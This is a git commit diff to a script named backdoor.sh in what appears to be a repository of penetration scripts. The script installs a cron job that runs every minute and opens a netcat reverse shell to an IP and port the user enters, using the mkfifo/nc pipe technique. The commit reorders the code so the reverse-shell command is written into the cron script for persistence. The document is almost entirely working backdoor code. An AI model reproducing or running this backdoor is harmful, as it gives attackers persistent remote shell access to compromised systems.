d2b688255492561c6e4c80b42292e7f41a7ac961
rp729 <44709247+rp729@users.noreply.github.com>
2019-01-19 13:42:05 -0500

    Update backdoor.sh

--- Penetration_Scripts/backdoor.sh
+++ Penetration_Scripts/backdoor.sh
@@ -10,7 +10,8 @@ echo "*/1 * * * * bash $PWD/cronscript.sh" > /var/spool/cron/crontabs/$USER
 
 read -p "Enter destination ip :" IP
 read -p "Enter destination port :" PORT
+echo "rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc $IP $PORT > /tmp/f" >> cronscript.sh
 rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc $IP $PORT > /tmp/f
 
-echo "rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc $IP $PORT > /tmp/f" >> cronscript.sh
+
 
